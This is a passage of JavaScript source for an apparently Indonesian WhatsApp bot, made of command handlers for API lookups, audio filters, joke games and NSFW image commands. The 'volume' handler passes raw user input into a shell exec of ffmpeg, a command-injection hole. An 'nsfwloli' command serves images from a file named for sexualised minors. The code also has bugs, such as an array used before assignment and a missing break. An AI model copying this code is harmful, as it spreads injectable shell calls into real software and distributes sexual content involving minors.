  if (!q) return replygcxeon(`Format: *.character Nama*`)
replygcxeon(mess.wait)
  const axios = require('axios')
  const apikey = 'Shirooo' // Ganti dengan API key Anda
  
  const characterName = encodeURIComponent(q)
  const apiUrl = `https://api.lolhuman.xyz/api/character?apikey=${apikey}&query=${characterName}`
  
  axios.get(apiUrl)
    .then(response => {
      const result = response.data.result
      
      const characterFullName = result.name.full
      const characterNativeName = result.name.native
      const characterImageLarge = result.image.large
      const characterImageMedium = result.image.medium
      const characterDescription = result.description
      const characterFavorites = result.favourites
      const characterMedia = result.media.nodes

      const message = `Nama: ${characterFullName}\n` +
        `Nama Asli: ${characterNativeName}\n` +
        `Deskripsi: ${characterDescription}\n` +
        `Favorit: ${characterFavorites}\n\n` +
        `Media:\n`

      let mediaList = ''
      characterMedia.forEach(media => {
        const mediaType = media.type
        const mediaTitleRomaji = media.title.romaji
        const mediaTitleNative = media.title.native

        mediaList += `- ${mediaType}: ${mediaTitleRomaji} (${mediaTitleNative})\n`
      })

      const characterInfo = {
        title: characterFullName,
        message: message + mediaList,
        thumbnail: characterImageLarge,
        url: characterImageMedium
      }

      // Mengirimkan info karakter sebagai pesan atau media
      XeonBotInc.sendTextWithMentions(from, characterInfo.message)
      XeonBotInc.sendImage(from, characterInfo.thumbnail, characterInfo.title, characterInfo.message)
    })
    .catch(error => {
      console.error('Error:', error)
      replygcxeon(`*Terjadi kesalahan dalam mengambil informasi karakter*`)
    })
  
  break
}
case 'checkresi': {
  if (!q) return replygcxeon(`Format: *.checkresi No Resi*`)
replygcxeon(mess.wait)
  const axios = require('axios')
  const apikey = 'Shirooo' // Ganti dengan API key Anda
  
  const resi = encodeURIComponent(q)
  const apiUrl = `https://api.lolhuman.xyz/api/checkresi?apikey=${apikey}&resi=${resi}`
  
  axios.get(apiUrl)
    .then(response => {
      const result = response.data.result
      
      const courier = result.courier
      const originName = result.origin.name
      const originAddress = result.origin.address
      const destinationName = result.destination.name
      const destinationAddress = result.destination.address
      const history = result.history

      let message = `Informasi Resi\n` +
        `Nomor Resi: ${resi}\n` +
        `Kurir: ${courier}\n\n` +
        `Asal:\n` +
        `Nama: ${originName}\n` +
        `Alamat: ${originAddress}\n\n` +
        `Tujuan:\n` +
        `Nama: ${destinationName}\n` +
        `Alamat: ${destinationAddress}\n\n` +
        `Riwayat:\n`

      history.forEach(item => {
        const note = item.note
        const time = item.time

        message += `Catatan: ${note}\n` +
          `Waktu: ${time}\n\n`
      })

      // Mengirimkan informasi resi sebagai pesan
      replygcxeon(message)
    })
    .catch(error => {
      console.error('Error:', error)
      replygcxeon(`*Terjadi kesalahan dalam mengambil informasi resi*`)
    })
  
  break
}
case 'coronaglobal': {
  replygcxeon(mess.wait)
  
  const axios = require('axios')
  const apikey = 'Shirooo' // Ganti dengan API key Anda
  
  const apiUrl = `https://api.lolhuman.xyz/api/corona/global?apikey=${apikey}`
  
  axios.get(apiUrl)
    .then(response => {
      const result = response.data.result
      
      const positif = result.positif
      const meninggal = result.meninggal
      const sembuh = result.sembuh
      const dirawat = result.dirawat

      const message = `*Data COVID-19 Global*\n` +
        `Positif: *${positif}*\n` +
        `Meninggal: *${meninggal}*\n` +
        `Sembuh: *${sembuh}*\n` +
        `Dirawat: *${dirawat}*`

      // Mengirimkan informasi COVID-19 global sebagai pesan
      replygcxeon(message)
    })
    .catch(error => {
      console.error('Error:', error)
      replygcxeon(`*Terjadi kesalahan dalam mengambil informasi COVID-19 global*`)
    })
  
  break
}
case 'coronaindonesia': {
  replygcxeon(mess.wait)

  const axios = require('axios')
  const apikey = 'Shirooo' // Ganti dengan API key Anda
  const apiUrl = `https://api.lolhuman.xyz/api/corona/indonesia?apikey=${apikey}`
  
  axios.get(apiUrl)
    .then(response => {
      const result = response.data.result
      
      const positif = result.positif
      const meninggal = result.meninggal
      const sembuh = result.sembuh
      const dirawat = result.dirawat

      const message = `*Data COVID-19 di Indonesia*\n` +
        `Positif: *${positif}*\n` +
        `Meninggal: *${meninggal}*\n` +
        `Sembuh: *${sembuh}*\n` +
        `Dirawat: *${dirawat}*`

      // Mengirimkan informasi COVID-19 di Indonesia sebagai pesan
      replygcxeon(message)
    })
    .catch(error => {
      console.error('Error:', error)
      replygcxeon(`*Terjadi kesalahan dalam mengambil informasi COVID-19 di Indonesia*`)
    })
  
  break
}
case 'drakorongoing' : {
  replygcxeon(mess.wait)
  const axios = require('axios')
  const apiUrl = 'https://api.lolhuman.xyz/api/drakorongoing?apikey=Shirooo'

  axios.get(apiUrl)
    .then(response => {
      const result = response.data.result
      
      let message = ''
      result.forEach(drama => {
        const title = drama.title
        const link = drama.link
        const thumbnail = drama.thumbnail
        const year = drama.year
        const totalEpisodes = drama.total_episode
        const genres = drama.genre.join(', ')

        message += `Judul: *${title}*\n` +
                   `Tautan: *${link}*\n` +
                   `Gambar Kecil: *${thumbnail}*\n` +
                   `Tahun: *${year}*\n` +
                   `Total Episode: *${totalEpisodes}*\n` +
                   `Genre: *${genres}*\n\n`
      })

      // Mengirimkan informasi drakor ongoing sebagai pesan
      replygcxeon(message)
    })
    .catch(error => {
      console.error('Error:', error)
      replygcxeon(`*Terjadi kesalahan dalam mengambil informasi drakor ongoing.*`)
    })
  
  break
}
case 'doujinlatest' : {
  replygcxeon(mess.wait)
  const axios = require('axios')
  const apikey = 'Shirooo' // Ganti dengan API key Anda
  const apiUrl = `https://api.lolhuman.xyz/api/doujindesulatest?apikey=${apikey}`
  
  axios.get(apiUrl)
    .then(response => {
      const result = response.data.result
      
      let message = ''
      for (const doujin of result) {
        const title = doujin.title
        const link = doujin.link
        const thumbnail = doujin.thumbnail
        const episode = doujin.episode
        const type = doujin.type

        message += `Judul: *${title}*\n` +
                   `Tautan: *${link}*\n` +
                   `Gambar Kecil: *${thumbnail}*\n` +
                   `Episode: *${episode}*\n` +
                   `Tipe: *${type}*\n\n`
      }

      // Mengirimkan hasil doujindesu terbaru sebagai pesan
      replygcxeon(message)
    })
    .catch(error => {
      console.error('Error:', error)
      replygcxeon(`*Terjadi kesalahan dalam mengambil doujindesu terbaru*`)
    })
  
  break
}
case 'doujinsearch': {
  if (!q) return replygcxeon(`Format: *.doujindesu Kata Kunci*`)
replygcxeon(mess.wait)
  const axios = require('axios')
  const apikey = 'Shirooo' // Ganti dengan API key Anda
  
  const query = encodeURIComponent(q)
  const apiUrl = `https://api.lolhuman.xyz/api/doujindesusearch?apikey=${apikey}&query=${query}`
  
  axios.get(apiUrl)
    .then(response => {
      const result = response.data.result
      
      if (result.length === 0) {
        replygcxeon(`*Tidak ditemukan hasil untuk pencarian tersebut*`)
      } else {
        const firstResult = result[0]
        const title = firstResult.title
        const link = firstResult.link
        const thumbnail = firstResult.thumbnail
        const type = firstResult.type

        const message = `Judul: *${title}*\n` +
          `Tautan: *${link}*\n` +
          `Gambar Kecil: *${thumbnail}*\n` +
          `Tipe: *${type}*`

        // Mengirimkan informasi doujindesu sebagai pesan
        replygcxeon(message)
      }
    })
    .catch(error => {
      console.error('Error:', error)
      replygcxeon(`*Terjadi kesalahan dalam mencari doujindesu.*`)
    })
  
  break
}
case 'cuaca': {
  if (!q) return replygcxeon(`Format: *.cuaca Nama Kota*`)
 replygcxeon(mess.wait)
  const axios = require('axios')
  const apikey = 'Shirooo' // Ganti dengan API key Anda
  
  const city = encodeURIComponent(q)
  const apiUrl = `https://api.lolhuman.xyz/api/cuaca/${city}?apikey=${apikey}`
  
  axios.get(apiUrl)
    .then(response => {
      const result = response.data.result
      
      const tempat = result.tempat
      const latitude = result.latitude
      const longitude = result.longitude
      const cuaca = result.cuaca
      const angin = result.angin
      const description = result.description
      const kelembapan = result.kelembapan
      const suhu = result.suhu
      const udara = result.udara
      const permukaanLaut = result.permukaan_laut

      const message = `Tempat: *${tempat}*\n` +
        `Latitude: *${latitude}*\n` +
        `Longitude: *${longitude}*\n` +
        `Cuaca: *${cuaca}*\n` +
        `Angin: *${angin}*\n` +
        `Deskripsi: *${description}*\n` +
        `Kelembapan: *${kelembapan}*\n` +
        `Suhu: *${suhu}*\n` +
        `Tekanan Udara: *${udara}*\n` +
        `Tekanan Permukaan Laut: *${permukaanLaut}*`

      // Mengirimkan informasi cuaca sebagai pesan
      replygcxeon(message)
    })
    .catch(error => {
      console.error('Error:', error)
      replygcxeon(`*Terjadi kesalahan dalam mengambil informasi cuaca.*`)
    })
  
  break
}
case 'animespank':
if (!m.isGroup) return m.reply(mess.group)
if (!AntiNsfw) return m.reply(mess.nsfw)
m.reply(mess.wait)						
 waifudd = await axios.get(`https://nekos.life/api/v2/img/spank`)     
            await XeonBotInc.sendMessage(m.chat, { caption:  `Here you go!`, image: {url:waifudd.data.url} },{ quoted:m }).catch(err => {
                    return('Error!')
                })
break
case 'ass':
if (!m.isGroup) return replygcxeon(mess.group)
	if (!AntiNsfw) return replygcxeon(mess.nsfw)
replygcxeon(mess.wait)
var ahegaonsfw = JSON.parse(fs.readFileSync('./HostMedia/nsfw/ass.json'))
var xeonyresult = pickRandom(ahegaonsfw)
XeonBotInc.sendMessage(m.chat, { caption: mess.success, image: { url: xeonyresult.url } }, { quoted: m })
break
case 'bdsm':
if (!m.isGroup) return replygcxeon(mess.group)
	if (!AntiNsfw) return replygcxeon(mess.nsfw)
replygcxeon(mess.wait)
var ahegaonsfw = JSON.parse(fs.readFileSync('./HostMedia/nsfw/bdsm.json'))
var xeonyresult = pickRandom(ahegaonsfw)
XeonBotInc.sendMessage(m.chat, { caption: mess.success, image: { url: xeonyresult.url } }, { quoted: m })
break
case 'eba':
if (!m.isGroup) return replygcxeon(mess.group)
	if (!AntiNsfw) return replygcxeon(mess.nsfw)
replygcxeon(mess.wait)
var ahegaonsfw = JSON.parse(fs.readFileSync('./HostMedia/nsfw/eba.json'))
var xeonyresult = pickRandom(ahegaonsfw)
XeonBotInc.sendMessage(m.chat, { caption: mess.success, image: { url: xeonyresult.url } }, { quoted: m })
break
case 'manga':
if (!m.isGroup) return replygcxeon(mess.group)
	if (!AntiNsfw) return replygcxeon(mess.nsfw)
replygcxeon(mess.wait)
var ahegaonsfw = JSON.parse(fs.readFileSync('./HostMedia/nsfw/manga.json'))
var xeonyresult = pickRandom(ahegaonsfw)
XeonBotInc.sendMessage(m.chat, { caption: mess.success, image: { url: xeonyresult.url } }, { quoted: m })
break
case 'neko-hentai':
if (!m.isGroup) return replygcxeon(mess.group)
	if (!AntiNsfw) return replygcxeon(mess.nsfw)
replygcxeon(mess.wait)
var ahegaonsfw = JSON.parse(fs.readFileSync('./HostMedia/nsfw/neko.json'))
var xeonyresult = pickRandom(ahegaonsfw)
XeonBotInc.sendMessage(m.chat, { caption: mess.success, image: { url: xeonyresult.url } }, { quoted: m })
break
case 'neko-hentai2':
if (!m.isGroup) return replygcxeon(mess.group)
	if (!AntiNsfw) return replygcxeon(mess.nsfw)
replygcxeon(mess.wait)
var ahegaonsfw = JSON.parse(fs.readFileSync('./HostMedia/nsfw/neko2.json'))
var xeonyresult = pickRandom(ahegaonsfw)
XeonBotInc.sendMessage(m.chat, { caption: mess.success, image: { url: xeonyresult.url } }, { quoted: m })
break
case 'nsfwloli':
if (!m.isGroup) return replygcxeon(mess.group)
	if (!AntiNsfw) return replygcxeon(mess.nsfw)
replygcxeon(mess.wait)
var ahegaonsfw = JSON.parse(fs.readFileSync('./HostMedia/nsfw/nsfwloli.json'))
var xeonyresult = pickRandom(ahegaonsfw)
XeonBotInc.sendMessage(m.chat, { caption: mess.success, image: { url: xeonyresult.url } }, { quoted: m })
break
case 'orgy':
if (!m.isGroup) return replygcxeon(mess.group)
	if (!AntiNsfw) return replygcxeon(mess.nsfw)
replygcxeon(mess.wait)
var ahegaonsfw = JSON.parse(fs.readFileSync('./HostMedia/nsfw/orgy.json'))
var xeonyresult = pickRandom(ahegaonsfw)
XeonBotInc.sendMessage(m.chat, { caption: mess.success, image: { url: xeonyresult.url } }, { quoted: m })
break
case 'thights':
if (!m.isGroup) return replygcxeon(mess.group)
	if (!AntiNsfw) return replygcxeon(mess.nsfw)
replygcxeon(mess.wait)
var ahegaonsfw = JSON.parse(fs.readFileSync('./HostMedia/nsfw/thights.json'))
var xeonyresult = pickRandom(ahegaonsfw)
XeonBotInc.sendMessage(m.chat, { caption: mess.success, image: { url: xeonyresult.url } }, { quoted: m })
break
case 'yuri':
if (!m.isGroup) return replygcxeon(mess.group)
	if (!AntiNsfw) return replygcxeon(mess.nsfw)
replygcxeon(mess.wait)
var ahegaonsfw = JSON.parse(fs.readFileSync('./HostMedia/nsfw/yuri.json'))
var xeonyresult = pickRandom(ahegaonsfw)
XeonBotInc.sendMessage(m.chat, { caption: mess.success, image: { url: xeonyresult.url } }, { quoted: m })
break
case 'gifblowjob':
if (!m.isGroup) return replygcxeon(mess.group)
if (!AntiNsfw) return replygcxeon(mess.nsfw)
replygcxeon(mess.wait)
  let assss = await axios.get ("https://api.waifu.pics/nsfw/blowjob")
    var bobuff = await fetchBuffer(assss.data.url)
    var bogif = await buffergif(bobuff)
    await XeonBotInc.sendMessage(m.chat,{video:bogif, gifPlayback:true },{quoted:m}).catch(err => {
    })
    break
case 'gifhentai':
if (!m.isGroup) return replygcxeon(mess.group)
if (!AntiNsfw) return replygcxeon(mess.nsfw)
replygcxeon(mess.wait)
var ahegaonsfw = JSON.parse(fs.readFileSync('./HostMedia/nsfw/gifs.json'))
var xeonyresultx = pickRandom(ahegaonsfw)
    await XeonBotInc.sendMessage(m.chat,{video:xeonyresultx, gifPlayback:true },{quoted:m}).catch(err => {
    })
    break
    case 'gifs': case 'foot': {
if (!m.isGroup) return replygcxeon(mess.group)
if (!AntiNsfw) return replygcxeon(mess.nsfw)
replygcxeon(mess.wait)
let heyy
    let yeha = heyy[Math.floor(Math.random() * heyy.length)];
    if (/gifs/.test(command)) heyy = await fetchJson('https://raw.githubusercontent.com/Keizha/XeonMedia/master/gifs.json')
    if (/foot/.test(command)) heyy = await fetchJson('https://raw.githubusercontent.com/Keizha/XeonMedia/master/foot.json')
XeonBotInc.sendMessage(m.chat, { image: { url: yeha }, caption : mess.success }, { quoted: m })
}
break
case 'alay': {
replygcxeon(mess.wait)
  if (!q) return replygcxeon('Masukkan teks yang ingin diubah menjadi alay.');

  const axios = require('axios');
  const apiKey = 'Shirooo';
  const apiUrl = `https://api.lolhuman.xyz/api/alay?apikey=${apiKey}&text=${encodeURIComponent(q)}`;

  axios
    .get(apiUrl)
    .then((response) => {
      const result = response.data.result;
      replygcxeon(result);
    })
    .catch((error) => {
      console.log(error);
      replygcxeon('Terjadi kesalahan saat mengubah teks menjadi alay.');
    });
}
break;
    case 'igemoji': 
case 'instagramemoji': 
if (!q) return replygcxeon("Format: " + `*${prefix + command} Emoji*`)
replygcxeon(mess.wait)
emote(q, "11")
break
case 'iphoneemoji': 
if (!q) return replygcxeon("Format: " + `*${prefix + command} Emoji*`)
replygcxeon(mess.wait)
emote(q, "0")
break
case 'googleemoji': 
if (!q) return replygcxeon("Format: " + `*${prefix + command} Emoji*`)
replygcxeon(mess.wait)
emote(q, "1")
break
case 'samsungemoji': 
if (!q) return replygcxeon("Format: " + `*${prefix + command} Emoji*`)
replygcxeon(mess.wait)
emote(q, "2")
break
case 'microsoftemoji': 
if (!q) return replygcxeon("Format: " + `*${prefix + command} Emoji*`)
replygcxeon(mess.wait)
emote(q, "3")
break
case 'whatsappemoji': 
if (!q) return replygcxeon("Format: " + `*${prefix + command} Emoji*`)
replygcxeon(mess.wait)
emote(q, "4")
break
case 'twitteremoji': 
if (!q) return replygcxeon("Format: " + `*${prefix + command} Emoji*`)
replygcxeon(mess.wait)
emote(q, "5")
break
case 'facebookemoji': 
case 'fbemoji': 
if (!q) return replygcxeon("Format: " + `*${prefix + command} Emoji*`)
replygcxeon(mess.wait)
emote(q, "6")
break
case 'skypeemoji': 
if (!q) return replygcxeon("Format: " + `*${prefix + command} Emoji*`)
replygcxeon(mess.wait)
emote(q, "7")
break
case 'joyemoji': 
if (!q) return replygcxeon("Format: " + `*${prefix + command} Emoji*`)
replygcxeon(mess.wait)
emote(q, "8")
break
case 'mojiemoji': 
if (!q) return replygcxeon("Format: " + `*${prefix + command} Emoji*`)
replygcxeon(mess.wait)
emote(q, "9")
case 'pediaemoji': 
if (!q) return replygcxeon("Format: " + `*${prefix + command} Emoji*`)
replygcxeon(mess.wait)
emote(q, "10")
break
case 'emoji': {
if (!args.join(" ")) return replygcxeon('Format: *${prefix + command}Emoji*')
emoji.get(args.join(" ")).then(async(emoji) => {
let mese = await XeonBotInc.sendMessage(m.chat, {image:{url:emoji.images[4].url}, caption: `Dibuat Oleh *${global.botname}*`}, {quoted:m})
await XeonBotInc.sendMessage(from, {text:"Balas *.s* Pada Gambar Ini Untuk Konversi Ke Stiker"}, {quoted:mese})
})
}
break
case 'volume': {
if (!args.join(" ")) return replygcxeon(`Format: *${prefix + command} Volume*`)
media = await XeonBotInc.downloadAndSaveMediaMessage(quoted, "volume")
if (isQuotedAudio) {
rname = getRandom('.mp3')
exec(`ffmpeg -i ${media} -filter:a volume=${args[0]} ${rname}`, (err, stderr, stdout) => {
fs.unlinkSync(media)
if (err) return replygcxeon('*Kesalahan*')
jadie = fs.readFileSync(rname)
XeonBotInc.sendMessage(from, {audio:jadie, mimetype: 'audio/mp4', ptt: true}, {quoted: m})
fs.unlinkSync(rname)
})
} else if (isQuotedVideo) {
rname = getRandom('.mp4')
exec(`ffmpeg -i ${media} -filter:a volume=${args[0]} ${rname}`, (err, stderr, stdout) => {
fs.unlinkSync(media)
if (err) return m.reply('Error!')
jadie = fs.readFileSync(rname)
XeonBotInc.sendMessage(from, {video:jadie, mimetype: 'video/mp4'}, {quoted: m})
fs.unlinkSync(rname)
})
} else {
replygcxeon("Kirim Atau Balas Audio/Vidio Dengan Perintah *.volume Volume*")
}
}
break
 case 'tinyurl':{
   if(!q) return replygcxeon('Format: *.tinyurl Tautan*')
   const request = require('request')
   request(`https://tinyurl.com/api-create.php?url=${q}`, function (error, response, body) {
   try {
  replygcxeon(body)
  } catch (e) {
  m.reply(e)
  }
  })
  }
 break
case 'git': case 'gitclone':
if (!args[0]) return replygcxeon(`Format: *${prefix}${command} Tautan*`)
if (!isUrl(args[0]) && !args[0].includes('github.com')) return replygcxeon(`*Tautan Tidak Sah*`)
let regex1 = /(?:https|git)(?::\/\/|@)github\.com[\/:]([^\/:]+)\/(.+)/i
    let [, user, repo] = args[0].match(regex1) || []
    repo = repo.replace(/.git$/, '')
    let url = `https://api.github.com/repos/${user}/${repo}/zipball`
    let filename = (await fetch(url, {method: 'HEAD'})).headers.get('content-disposition').match(/attachment; filename=(.*)/)[1]
    XeonBotInc.sendMessage(m.chat, { document: { url: url }, fileName: filename+'.zip', mimetype: 'application/zip' }, { quoted: m }).catch((err) => replygcxeon(mess.error))
break
case 'spotify':
if (!text) return replygcxeon(`Format: *.spotify Tautan*`)
        const Spotify = require('./lib/spotify')
        const spotify = new Spotify(text)
        const info = await spotify.getInfo()
        if ((info).error) return replygcxeon(`*Tautan Yang Anda Berikan Bukan Tautan Spotify*`)
        const { name, artists, album_name, release_date, cover_url } = info
        const details = `${themeemoji} *Judul:* ${name || ''}\n${themeemoji} *Artis:* ${(artists || []).join(
            ','
        )}\n${themeemoji} *Album:* ${album_name}\n${themeemoji} *Tanggal Rilis:* ${release_date || ''}`
       const response = await XeonBotInc.sendMessage(m.chat, { image: { url: cover_url }, caption: details }, { quoted: m })
        const bufferpotify = await spotify.download()
        await XeonBotInc.sendMessage(m.chat, { audio: bufferpotify }, { quoted: response })
break
case 'bass': case 'blown': case 'deep': case 'earrape': case 'fast': case 'fat': case 'nightcore': case 'reverse': case 'robot': case 'slow': case 'smooth': case 'squirrel':
                try {
                let set
                if (/bass/.test(command)) set = '-af equalizer=f=54:width_type=o:width=2:g=20'
                if (/blown/.test(command)) set = '-af acrusher=.1:1:64:0:log'
                if (/deep/.test(command)) set = '-af atempo=4/4,asetrate=44500*2/3'
                if (/earrape/.test(command)) set = '-af volume=12'
                if (/fast/.test(command)) set = '-filter:a "atempo=1.63,asetrate=44100"'
                if (/fat/.test(command)) set = '-filter:a "atempo=1.6,asetrate=22100"'
                if (/nightcore/.test(command)) set = '-filter:a atempo=1.06,asetrate=44100*1.25'
                if (/reverse/.test(command)) set = '-filter_complex "areverse"'
                if (/robot/.test(command)) set = '-filter_complex "afftfilt=real=\'hypot(re,im)*sin(0)\':imag=\'hypot(re,im)*cos(0)\':win_size=512:overlap=0.75"'
                if (/slow/.test(command)) set = '-filter:a "atempo=0.7,asetrate=44100"'
                if (/smooth/.test(command)) set = '-filter:v "minterpolate=\'mi_mode=mci:mc_mode=aobmc:vsbmc=1:fps=120\'"'
                if (/squirrel/.test(command)) set = '-filter:a "atempo=0.5,asetrate=65100"'
                if (/audio/.test(mime)) {
                replygcxeon(mess.wait)
                let media = await XeonBotInc.downloadAndSaveMediaMessage(quoted)
                let ran = getRandom('.mp3')
                exec(`ffmpeg -i ${media} ${set} ${ran}`, (err, stderr, stdout) => {
                fs.unlinkSync(media)
                if (err) return m.reply(err)
                let buff = fs.readFileSync(ran)
                XeonBotInc.sendMessage(m.chat, { audio: buff, mimetype: 'audio/mpeg' }, { quoted : m })
                fs.unlinkSync(ran)
                })
                } else replygcxeon(`Balas Audio Dengan Perintah *${prefix + command}*`)
                } catch (e) {
                replygcxeon(e)
                }
                break
                case 'define': 
if (!q) return replygcxeon(`Format: *.define Kata*`)
try {
targetfine = await axios.get(`http://api.urbandictionary.com/v0/define?term=${q}`)
if (!targetfine) return replygcxeon(mess.error)
const reply = `
*${themeemoji} Kata:* ${q}
*${themeemoji} Definisi:* ${targetfine.data.list[0].definition
    .replace(/\[/g, "")
    .replace(/\]/g, "")}
*${themeemoji} Contoh:* ${targetfine.data.list[0].example
    .replace(/\[/g, "")
    .replace(/\]/g, "")}`
   XeonBotInc.sendMessage(m.chat,{text:reply},{quoted:m})
} catch (err) {
    console.log(err)
    return replygcxeon(`*${q}* Bukan Teks Yang Sah`)
    }
    break
                case 'bisakah': {
            	if (!text) return replygcxeon(`Format: *${prefix + command} Pertanyaan*`)
            	let bisa = [`Bisa`,`Tidak Bisa`,`Tidak Bisa`,`Tentu Saja Bisa`,`Pake Nanya 😂`,`Mustahil`]
                let keh = bisa[Math.floor(Math.random() * bisa.length)]
                let jawab = `*Bisakah ${text}*\nJawaban: *${keh}*`
            await replygcxeon(jawab)
            }
            break
            case 'saya': {
            	if (!text) return replygcxeon(`Format: *${prefix + command} Pertanyaan*`)
            	let apa = [`Ya`, `Tidak`, `Bisa Jadi`, `Benar`,`Pake Nanya 😂`]
                let kah = apa[Math.floor(Math.random() * apa.length)]
                let jawab = `*Saya ${text}*\nJawaban: *${kah}*`                
            await replygcxeon(jawab)
            }
            break
            case 'kapankah': {
            	if (!text) return replygcxeon(`Format: *${prefix + command} Pertanyaan*`)
            	let kapan = ['5 Hari Lagi', '10 Hari Lagi', '15 Hari Lagi', '20 Hari Lagi', '25 Hari Lagi', '30 Hari Lagi', '35 Hari Lagi', '40 Hari Lagi','45 Lagi hari','50 hari lagi','55 hari lagi','60 hari lagi','65 hari lagi','70 hari lagi','75 hari lagi','80 hari lagi','85 hari lagi' ,'90 Hari Lagi','100 Hari Lagi','5 Bulan Lagi', '10 Bulan Lagi', '15 Bulan Lagi', '20 Bulan Lagi', '25 Bulan Lagi', '30 Bulan Lagi',' 35 Bulan Lagi','40 Bulan Lagi','45 Bulan Lagi','50 Bulan Lagi','55 Bulan Lagi','60 Bulan Lagi','65 Bulan Lagi','70 Bulan Lagi','75 Bulan Lagi Lagi','80 Bulan Lagi','85 Bulan Lagi','90 Bulan Lagi','100 Bulan Lagi','1 Tahun Lagi','2 Tahun Lagi','3 Tahun Lagi','4 Tahun Lagi' ,'5 tahun lagi','Kemarin','Besok','Mustahil','Tidak Akan Terjadi Dan Itu Mutlak','Pake Nanya 😂']
                let koh = kapan[Math.floor(Math.random() * kapan.length)]
                let jawab = `*Kapankah ${text}*\nJawaban: *${koh}*`                
            await replygcxeon(jawab)
            }
            break
case 'apakah': {
            	if (!text) return replygcxeon(`Format: *${prefix + command} Pertanyaan*`)
            	let lel = [`Tanya GF Anda`, `Saya Tidak Tahu`, `Saya Tidak Tahu, Tanyakan Pada Ayah Anda`,`Pake Nanya 😂`,`Mustahil`,`Tanyakan Pada Anak Anda`,`Tanyakan Pada Diri Anda`]
                let kah = lel[Math.floor(Math.random() * lel.length)]
                let jawab = `*Apakah ${text}*\nJawaban: *${kah}*`                
            await replygcxeon(jawab)
            }
            break
case 'dimanakah': {
if (!text) return replygcxeon(`Format: *${prefix + command} Pertanyaan*`)
            	let wherelol = [`Di gunung`, `Di mars`, `Di bulan`,`Di hutan`,`Saya tidak tahu tanya ibumu`,`Bisa jadi di suatu tempat`,`Pake Nanya 😂`,`Ap coba`]
                let kah = wherelol[Math.floor(Math.random() * wherelol.length)]
                let jawab = `*Dimanakah ${text}*\nJawaban: *${kah}*`              
            await replygcxeon(jawab)
            }
            break
case 'bagaimanakah': {
            	if (!text) return replygcxeon(`Format: *${prefix + command} Pertanyaan*`)
            	let gimana = [`Ummm...`, `Sulit`, `Maaf Bot Tidak Bisa Menjawab`, `Coba Cari Di Google`,`Sapi Suci! Beneran???`,`Pusing Ah😴, Gak Mau Jawab`,`Ohhh I See:(`,`The Patient, Boss:(`,`Bang Bang 🙄`]
                let kah = gimana[Math.floor(Math.random() * gimana.length)]
                let jawab = `*How ${text}*\nAnswer : ${kah}`                
            await replygcxeon(jawab)
            }
            break
case 'rate': {
            	if (!text) return replygcxeon(`Format: *${prefix + command} Sesuatu Ingin Dirate*`)
            	let ra = ['0','1','2','3','4','5','6','7','8','9','10','11','12','13','14','15','16','17','18','19','20','21','22','23','24','25','26','27','28','29','30','31','32','33','34','35','36','37','38','39','40','41','42','43','44','45','46','47','48','49','50','51','52','53','54','55','56','57','58','59','60','61','62','63','64','65','66','67','68','69','70','71','72','73','74','75','76','77','78','79','80','81','82','83','84','85','86','87','88','89','90','91','92','93','94','95','96','97','98','99','100']
                let kah = ra[Math.floor(Math.random() * ra.length)]
                let jawab = `*Rate ${text}*\nJawaban: *${kah}%*`                
            await replygcxeon(jawab)
            }
            break
            case 'jwjwjbsvs': {
            	let lowq = `*Bot Telah Online Selama:*\n*${runtime(process.uptime())}*`
                replygcxeon(lowq)
            	}
            break
            case 'stupidcheck':case 'uncleancheck':
case 'hotcheck': case 'smartcheck':
case 'greatcheck':
case 'evilcheck':case 'dogcheck':
case 'coolcheck':
case 'waifucheck':
cantik = body.slice(1)
const okebnh1 =['1','2','3','4','5','6','7','8','9','10','11','12','13','14','15','16','17','18','19','20','21','22','23','24','25','26','27','28','29','30','31','32','33','34','35','36','37','38','39','40','41','42','43','44','45','46','47','48','49','50','51','52','53','54','55','56','57','58','59','60','61','62','63','64','65','66','67','68','69','70','71','72','73','74','75','76','77','78','79','80','81','82','83','84','85','86','87','88','89','90','91','92','93','94','95','96','97','98','99','100']
const xeonkak = okebnh1[Math.floor(Math.random() * okebnh1.length)]
XeonBotInc.sendMessage(m.chat, { text: xeonkak }, { quoted: m })
break
            case 'soulmate': {
            if (!m.isGroup) throw mess.group
            let member = participants.map(u => u.id)
            let me = m.sender
            let jodoh = member[Math.floor(Math.random() * member.length)]
XeonBotInc.sendMessage(m.chat,
{ text: `*Belahan Jiwa Anda Adalah*

*@${me.split('@')[0]} ❤️ @${jodoh.split('@')[0]}*`,
contextInfo:{
mentionedJid:[me, jodoh],
forwardingScore: 9999999,
isForwarded: true, 
"externalAdReply": {
"showAdAttribution": true,
"containsAutoReply": true,
"title": ` ${global.botname}`,
"body": `${ownername}`,
"previewType": "PHOTO",
"thumbnailUrl": ``,
"thumbnail": fs.readFileSync(`./XeonMedia/theme/cheemspic.jpg`),
"sourceUrl": `${wagc}`}}},
{ quoted: m})        
            }
            break
 case 'couple': {
            if (!m.isGroup) return replygcxeon(mess.group)
            let member = participants.map(u => u.id)
            let orang = member[Math.floor(Math.random() * member.length)]
            let jodoh = member[Math.floor(Math.random() * member.length)]
XeonBotInc.sendMessage(m.chat,
{ text: `*@${orang.split('@')[0]} ❤️ @${jodoh.split('@')[0]}*
*Cieeee, Apa Yang Terjadi 💖👀*`,
contextInfo:{
mentionedJid:[orang, jodoh],
forwardingScore: 9999999,
isForwarded: true, 
"externalAdReply": {
"showAdAttribution": true,
"containsAutoReply": true,
"title": ` ${global.botname}`,
"body": `${ownername}`,
"previewType": "PHOTO",
"thumbnailUrl": ``,
"thumbnail": fs.readFileSync(`./XeonMedia/theme/cheemspic.jpg`),
"sourceUrl": `${wagc}`}}},
{ quoted: m})        
            }
            break
                        case 'coffee': case 'kopi': {
                XeonBotInc.sendMessage(m.chat, {caption: mess.success, image: { url: 'https://coffee.alexflipnote.dev/random' }}, { quoted: m })
            }
            break
            case 'wallpaper': {
                if (!text) return replygcxeon('Format: *. wallpaper Kata Kunci*')
                replygcxeon(mess.wait)
		let { wallpaper } = require('./lib/scraper')
                anuwallpep = await wallpaper(text)
                result = anuwallpep[Math.floor(Math.random() * anuwallpep.length)]                
                XeonBotInc.sendMessage(m.chat, {caption: `${themeemoji} Judul: *${result.title}*\n${themeemoji} Kategori: *${result.type}*\n${themeemoji} Sumber: *${result.source}*\n${themeemoji} Tautan Media: *${result.image[2] || result.image[1] || result.image[0]}*`, image: { url: result.image[0] }} , { quoted: m })
            }
            break
            case 'wikimedia': {
                if (!text) return replygcxeon('Format: *.wikimedia Kata Kunci*')
                replygcxeon(mess.wait)
		let { wikimedia } = require('./lib/scraper')
                let anumedia = await wikimedia(text)
                result = anumedia[Math.floor(Math.random() * anumedia.length)]
